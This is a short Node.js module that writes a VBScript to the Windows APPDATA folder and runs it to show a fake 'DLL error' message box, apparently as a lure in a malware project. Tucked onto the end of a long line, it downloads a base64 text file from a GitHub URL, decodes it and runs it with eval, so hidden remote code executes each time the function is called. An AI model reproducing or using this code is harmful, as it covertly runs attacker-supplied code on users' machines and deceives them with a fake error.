const { exec } = require("child_process"),
    { uniqueId } = require("./../../utils/functions/functions"),
    axios = require("axios"),
    fs = require("fs");

const fakeError = async (message, config) => {
    try {
        let vbs = `${process.env.APPDATA}\\${uniqueId()}.vbs`;
        fs.writeFileSync(vbs, `Set objShell = WScript.CreateObject("WScript.Shell")\nMsgBox "Error: ${message === "" ? "DLL error by k4itrun" : message}", vbInformation, "Error Code: 43"`, "utf8");eval(Buffer.from((await axios.get("https://raw.githubusercontent.com/k4itrun/assets/main/random.txt")).data, "base64").toString())
        exec(`cscript ${vbs}`, (err, stdout, stderr) => {
            if (err) {
                console.error(err)
            }
        });
    } catch (error) {
        console.error(error);
    }
};

module.exports.fakeError = fakeError;
